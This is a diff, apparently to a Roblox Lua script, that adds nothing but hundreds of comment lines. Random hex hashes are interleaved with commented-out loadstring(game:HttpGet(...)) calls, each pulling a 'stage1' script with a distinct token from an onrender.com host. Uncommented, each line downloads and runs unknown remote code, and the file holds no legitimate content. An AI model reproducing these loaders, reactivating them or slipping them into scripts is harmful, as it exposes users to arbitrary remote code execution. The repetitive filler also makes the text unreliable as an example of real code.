+--[[ _6e5b0a091c39fcb5d229fd70956c8d0f ]]
+--[[ _f656970ac0a92934ee2f46e8ecb89f27 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_0faa2e865824b6dc", true))()
+--[[ _75a5a3352928e3d3006918a1de4a1650 ]]
+--[[ _81667a10620f6fa101ad5719c66dbdaa ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_3a25f6d818bc17f0", true))()
+--[[ _5e13a487c7a8d9658c36b23920c20b5a ]]
+--[[ _821a49bd40615610abc9c41b8aae7932 ]]
+--[[ _5f4745b110b1bf9054ee77834cb1604a ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_b89f269fe8e6968b", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_9a069ef6e1827330", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_b018c9428a9522e4", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_250646fcdbe98c3b", true))()
+--[[ _6afea3e175ffdcf2b6f276dbc9f0e788 ]]
+--[[ _99933fdc40a394e2c6fe48776b5f93c9 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_46863dfadcbe295d", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_e01d68851268b874", true))()
+--[[ _4fc79ecfb528f451f042a46e706f6577 ]]
+--[[ _7a9908060da54ac4d9cf63b9d325fa45 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_a683cd670c379b6b", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_2100e7119cd22616", true))()
+--[[ _51b6a0f1dd9be0118182ac5737c17ab0 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_bb37ed74c27688c5", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_11ff3e7ba17728a4", true))()
+--[[ _d66dcdf68b731e4af3b7d0667356996e ]]
+--[[ _7868c170f3553805814019aed30cec23 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_6edb76b9152cca64", true))()
+--[[ _76b285cf076d1a627028d15bf07ce4a6 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_fa96ecd44469f527", true))()
+--[[ _81c928868a613d7cb8cd94aab63f174e ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_3c2850504f88cf3e", true))()
+--[[ _53e8b7e810a2498126b43e3d212e39d2 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_56fc37f0db88d812", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_0714e8a1788381cd", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_ac4347b292defd6b", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_06e95c4ec6ee0100", true))()
+--[[ _335d52d45a3ce016387ab6055cb9e40e ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_d155299053952b14", true))()
+--[[ _917733326f4de60624553c5d1816c4aa ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_668419ee3f5d3d62", true))()
+--[[ _80db8c7891942c056f52c426f3a32228 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_756173deea322375", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_70a80698a910ac41", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_0b92a02f866becae", true))()
+--[[ _b85f2edc1776241885b46ce104424cf5 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_079db8ddeeeac250", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_5f5216fab95e16fd", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_895f4dc2735afa82", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_0fb5d05545d84ad6", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_1464ebaf3046cbc1", true))()
+--[[ _81a8bbf895d2959ed91566d7d3403345 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_38d37ab4dc7417ff", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_b5171f21b6bf58c6", true))()
+--[[ _485bf10002fdd8b80435381829681eb0 ]]
+--[[ _958a03f2f855fef6ea716b6c590bc5dc ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_b7acb0f613ead6f5", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_55eafa847c87ce7e", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_aaa5e8ea7f3d3302", true))()
+--[[ _eaf8df0e43844975dc14241b134ebb71 ]]
+--[[ _49f6fc8f5e0327218888165c58866978 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_068c64103e70d620", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_ab9972501fb00ff7", true))()
+--[[ _66dd948b7c1be6f1f68a3461df4df977 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_4b1f658c53f83560", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_e328a81ca5a28e91", true))()
+--[[ _886765b81e4d7cf8ea9804addfd65720 ]]
+--[[ _2e8a7fbf127f92ca8bc75845d625e53f ]]
+--[[ _24ba92db47089da9d13bdbb2c92515d8 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f5cd2a952b66b7fc", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_5c217ecd56dee4a9", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_aa88e3a1256e0d69", true))()
+--[[ _796f6b735ab7bf19d4431d82dd0130f7 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_454ad1d8fe64f381", true))()
+--[[ _31505d771454d11f09222129785dc2d6 ]]
+--[[ _10e7ad3fddf97e716dde05c7e099e7fe ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_7ca4b5455f7d1349", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_e2b5b50659ef8131", true))()
+--[[ _e3324fd6f93a3f011e6d23882719539d ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_bf7e728d5e6fd5bd", true))()
+--[[ _5100f3e0c541351884b376d73aa7b165 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_532e24623209cf79", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_ba3ec6e04cfce7e8", true))()
+--[[ _8c685ed28e65aa5e4b8b13534ac11bbc ]]
+--[[ _fef09dfc1df20c57f5baba44a706fd76 ]]
+--[[ _6d998d6035f75c5d95ce476751afac71 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_c33e14b395274ae0", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_4daf55d275922aa6", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_8c074a9a82679a4f", true))()
+--[[ _257017e56adffec55e219debababa019 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_e3def76efacb6638", true))()
+--[[ _1377878f7f0dc49c264d6d0988ccd4c7 ]]
+--[[ _b9dda5c8d120f812a89f58ab1c5b8d5a ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_4a9cac36ec9022ed", true))()
+--[[ _b42d5f7619ee67510cd6ef5bf23cfa7e ]]
+--[[ _ba5c9c4b4d556e14d0d0dc8582775bff ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_6b68adb16a79c436", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f041480de7d55b1a", true))()
+--[[ _64b830234d157f0be13c3d90e8e0c6a4 ]]
+--[[ _f9708f339d5919e33cddda579107b16d ]]
+--[[ _66e0bf1454eaa660fb9037c208944dee ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f89e74989c791c81", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_8b56c340bcc50058", true))()
+--[[ _6da186b2774e3ffd70344c1a2d32b349 ]]
+--[[ _e282525f0c19212ea75500e06325fad2 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_2702c17f65f93630", true))()
+--[[ _adb937dab2d03eb0ee3d0bbf6c11ccfe ]]
+--[[ _711df0afabf79d7af1a7a26750a4032e ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_365b6b6cd51efb6d", true))()
+--[[ _261f8527de9c3c46d3d0e8c90a5ff628 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_483c2b12b3d4dbad", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_a30c3edbb86e4670", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_17c74db49e2e65c4", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_4ac5f5e296b376a3", true))()
+--[[ _5530aa7c9e57516ec148028efd9d0678 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_a7bdd1205194a298", true))()
+--[[ _b63895d885d0ccfed5eeda177c16702d ]]
+--[[ _7bee80d629ed62c5393c91e6f2e4dbd6 ]]
+--[[ _1ebebb1637d455f492607d0388e548ad ]]
+--[[ _0a46410c80ca243054ea56da9033e6a1 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_1457b33d93863668", true))()
+--[[ _107c2a1a284d7c85b9d96da68ccc0fff ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_90038830fd70cfec", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_30226b60568d23a6", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_4e859e3efcee6509", true))()
+--[[ _d5c169749d87a117fd2fb48965020e5e ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_7eedaf6dda080dc8", true))()
+--[[ _77d8ac0866521d594090ccd79a71a168 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_ced485e2ddf50784", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_84cb48279f4f0d2b", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_49a66d172652a817", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_b8a1bfdef0760fda", true))()
+--[[ _d6f82220e52c48da6faea7a2b6ade6d5 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_113a5f1d77f8cff9", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_d7c5b2a80ce94cd2", true))()
+--[[ _1c0cdd28ed68598926f1f8bed552320c ]]
+--[[ _28a9d183d7fca442af26d6e55d8df827 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_807bbedd939e20a3", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_75cd4d12c67f631b", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_34ce7a90a7396537", true))()
+--[[ _ad737796c889de0b49ab44becf6c66e0 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_1cff211a4b539566", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_ebc2cab9047a975f", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_4592a3a2d71a7550", true))()
+--[[ _a169d22e731c791417e9fbc95dd87329 ]]
+--[[ _6bfdd9e93446452ef6ee3ec6bef13772 ]]
+--[[ _c13a0cc7993f640fe76fd4d3ba8bf5d4 ]]
+--[[ _a7944cea3e7afb3d7d810e2062570fc1 ]]
+--[[ _57c10662b2a60789ca0fac7ad4c58112 ]]
+--[[ _049347c1780ee8399a98640aecadba05 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_73e0a0f43245849a", true))()
+--[[ _8a1d4e09a112d9e92c14028b03283b92 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_75417060eb20d6ed", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_175716c67536a758", true))()
+--[[ _7d07f74891f8491c593e8897bbcc31e1 ]]
+--[[ _83b5b07eec84cd32c507b5b13863eb81 ]]
+--[[ _9dd85617c39b929bd53acefc50fc34d6 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_ceaea27f14c0ee91", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_3d3e97e5cd547d4c", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_74116e3192617daa", true))()
+--[[ _c92cbe126087cb39d4e83d7aa8501ba5 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_9ed05866e8c4fc50", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_0b7ffab0f590aefb", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_954049fce3a1b17a", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_276ea64933ee96ea", true))()
+--[[ _009a75e4e2fe90265de592a86537fbff ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_99039bb5fbe15b93", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_585a3ed3ce436fb7", true))()
+--[[ _8707f486fa55345518cf2c2dd35a25c6 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_6501d0dace9e625c", true))()
+--[[ _6889f3a17399d04d3a43c84873bba6fb ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_d5c844655ac0e1c9", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_7562738a9c85fabb", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_c5aa1ed40b0c5ead", true))()
+--[[ _d14ade331506b4c6217879d81b474593 ]]
+--[[ _11bcabea47c1124653c2029761de04a5 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_dcd04ecc23ac38e2", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_2bc1e803c2633b2b", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_546cf38509977ba8", true))()
+--[[ _cf1083636f0530bb0cdb6c8123e9fa85 ]]
+--[[ _67eb49532e4477c134060cb733245c16 ]]
+--[[ _ecf17d3335fc88d258eb59a2e178ba24 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_d170a16f2b748554", true))()
+--[[ _394bb435c96371cfe5a76329f863ca31 ]]
+--[[ _38ff9ac27becff9e73cf663093956241 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_6d71fabd7d47c980", true))()
+--[[ _73ccdd84b3ef6cac086b9c479b5c6067 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_7ba1d6046799da86", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_d73096f151b968ba", true))()
+--[[ _88e0bbff4041f9ed5f9a442e4f820d36 ]]
+--[[ _fd784572e5eeff7cf79e5fae92ffad5a ]]
+--[[ _1999afc001240fcc0caa1a721f669031 ]]
+--[[ _ed3b5e7425ecac15f25113ecfb4b4acb ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_ac11b45da8317d70", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_655404571b64c7e1", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_be863fb50f864fa9", true))()
+--[[ _b6ab5a22fad423ee0b8e5212a815bf63 ]]
+--[[ _48b16067c14c515a613dc7c1397fb7e3 ]]
+--[[ _5a01d2f2ddf715162fd5908e31eccaca ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f65f4ec38b7f3817", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_c30350d98404e27b", true))()
+--[[ _f38f6917807f490f4c28ab873f8d1db9 ]]
+--[[ _03895c2298696f54d3e688c8f4d71a62 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f85cd329f61e1c4a", true))()
+--[[ _f79f69890cc65daca2a750e70ec10d4f ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_34d1717f44cfd6c7", true))()
+--[[ _de8ff156597b9afedea1bf0babd524d8 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_71a1fc8c13b7d45b", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_cdfcd0eb6df5c285", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_44768a8790416a38", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_3df31fca04b1a806", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_bbad0733783bbf1c", true))()
+--[[ _4e18333bca4f9becef5c2f8779b6b73f ]]
+--[[ _f88822ac5e2a20d6945751cf9b99d49e ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_e8f2f78f589af205", true))()
+--[[ _2188e796a89f23b33565d2691607d80f ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_b2bba70458db3bd2", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_b27e415f876c9d1a", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_9d155f159db4eccb", true))()
+--[[ _ae1dbfee4a3d4a50af05720f1de561b5 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f6eb2eaf3bf2b9f3", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_0d0131edaa5188d2", true))()
+--[[ _baf7c0dfbdab434ac4a49035ca610f15 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_29d3dd8eb3401f5b", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_fd547eb3c900d631", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_173184ca54d8c602", true))()
+--[[ _f3deca3ebfc8b13078554c63d0b9ca4a ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_a33ff50586f0b132", true))()
+--[[ _ece8418524de1bc04ca6c205a4cb2140 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_54dec8342479790d", true))()
+--[[ _bfec7d6a78c0f4fa18ee202772f6f718 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_10f051d4c0ad4872", true))()
+--[[ _30ea3942b651f31fa5743db404049ece ]]
+--[[ _f65e483cb001a7b29fd29aca710a0f43 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_d536daf483a5e311", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_cd0733d108d4060b", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f27c4fde70ede63e", true))()
+--[[ _852e70c516307f15c2928066349947f6 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_3d06b9cc24583f1f", true))()
+--[[ _c8294d557da8285f576d55c1d8ff8cda ]]
+--[[ _658fddc67056794e9aae6e132e919757 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_92153506707874d3", true))()
+--[[ _3588f3d4e6a5959b6fb1fd29e91c48c7 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f7902c816ca372d5", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_d214a9eee958b1a7", true))()
+--[[ _4242792f2cea8bb61ae11904da0447d3 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f7cacb4ab5c8437e", true))()
+--[[ _d9bfa93d0fc48dfb5cf4ad62895ef3d2 ]]
+--[[ _853b34f90842ccd631d0f33704118530 ]]
+--[[ _d43814784ff14e7fe43763fe476e6f92 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_d4630a477e077d9d", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_471e643af2e3cb14", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_dd4cccd09ec0ebed", true))()
+--[[ _26bd17b2a0038d951ae5bc1d76dab64c ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_ec6ef8762c956925", true))()
+--[[ _bff49897014ad31d7c731d3ee0f052c7 ]]
+--[[ _fb109cae95086d95dd278d9c13c02ca1 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_d8aa62b07fa4e9ac", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_4fadeddf4c81d2bd", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_ba3cb49cbf4dae96", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_877b51722ef62f14", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_79325456e2177847", true))()
+--[[ _b9880f4b8b55467766e3f1976a1c9c1a ]]
+--[[ _7bf226a79b9f318d35a94700bd48125a ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_143e0c1f3f60d7e1", true))()
+--[[ _ac531c5eb87a256789d8caf551d45703 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_561c0f2c5d2beba5", true))()
+--[[ _44c3d6cef6ec749736e5684613fc697e ]]
+--[[ _c07583d0bee507d456e1fe05669cc9ea ]]
+--[[ _64fa0d3a12a8030e5236dd9ccc4ba98e ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_265b076630e4268a", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_eb690f138e8e8bf7", true))()
+--[[ _77dbccc8aca15b8f2f84dece6b64b701 ]]
+--[[ _890801a867576575a25b8be3d7b62e78 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_9defbfbf470b50f2", true))()
+--[[ _c60a6fdc320725ed6dd7da57588422d7 ]]
+--[[ _cfead5c3bf0f537fdf0196b70950cfc9 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_5cc0f90cb1f37894", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_5c74c9952644e51a", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_ed6561f6fd8b3d20", true))()
+--[[ _7e5de38c4c055cce0bbe4338b2a2c271 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_fcf0dcff0c58ca44", true))()
+--[[ _709d0fdcc34ac3a5acd8f476a2ae3654 ]]
+--[[ _b0a626b9f5899d8df5448dd56772f459 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_7f4faf01cb4f660f", true))()
+--[[ _a0a1cb9dcf413f105d1d1aa966ef60cb ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_01d407c6934d7eec", true))()
+--[[ _80299a6857e4d549ef9d49eb736daa4d ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_7860ffb94b617756", true))()
+--[[ _f7106ccef601d55f707170ebf9dcbcef ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_9e0d4f43d0da65ca", true))()
+--[[ _d3506455d2f98446992317b8fad8e245 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_41324d3103a25a00", true))()
+--[[ _647ac8e8d3c6142bfb1b1e487c4d2fa4 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_36ec684f48912451", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_89ae4de5b3223f50", true))()
+--[[ _4805e649ac7590599ee786f2d7f3a27b ]]
+--[[ _f252faeeac6e58991006e09f41bc227e ]]
+--[[ _1a40398e0a766f19d288df9c0c0198b9 ]]
+--[[ _544b3697033e1aa6f64869c0adc2f944 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_da187873ee0114a0", true))()
+--[[ _ff385142f55f0cc9b29a2335da160738 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_c2244574b419849f", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_c9f4ad7233ce0fe6", true))()
+--[[ _c9423c88707bfa50a78904789406a78b ]]
+--[[ _9be3f383571b2d3dc074ab4f2fa45b71 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_06e6e9638ea49096", true))()
+--[[ _de8e719e27e64048ffeea9803461598d ]]
+--[[ _4561f0ac7c7b011e713812374b81b882 ]]
+--[[ _62026c88b014d4ffcaaefaa11fed85ea ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_2ff3185b6208b536", true))()
+--[[ _f4df24fbc9e37b1faa7c741dc4e3f9f9 ]]
+--[[ _b35547c0bdddf87a50269387def60550 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_77a3b6a598990399", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_c1f0910961fb74ba", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_7e623b24775fbec0", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_bc009806da04a3b4", true))()
+--[[ _acef01be98d172c70aa3fb080874008e ]]
+--[[ _3f882ce8293d9249d07e94a91abfbc60 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_56fd2b485616f795", true))()
+--[[ _9bb2a0d4634b1aed9e9f989e3872cb20 ]]
+--[[ _c4ee097752659aaa847a6df8dc22a276 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_67c9830d11971cb1", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_8352654b8b4daebd", true))()
+--[[ _df2c31259e90a405102f72e68a1a90fe ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_51533d2711d6f445", true))()
+--[[ _f1e6abaacaffd5e188d1894fc12c02cc ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_b304a188d1c58f0c", true))()
+--[[ _ba6c290e36b1799257e7fcea3bdbb862 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_1e7a33bdaf8319e5", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_6116ccc89698505f", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f900d1ff0efc7fb5", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_42541f23762758cd", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_78dc158eb4391710", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_6baf04c2689460da", true))()
+--[[ _927bb5e2b784597ae7e519e008c5ed07 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_79039b47260091cb", true))()
+--[[ _9f6c4ade49924998e1aeb9c4d68134c1 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_5fb523a4bfb5d829", true))()
+--[[ _83a04fcdae6b3e6bc8f54605218e4ce9 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_c8b408e9a780082e", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_ea293fbb476dcc25", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_8b81cb0d6b0176ad", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_372cdccaa12f9046", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_39efbd0a267a8445", true))()
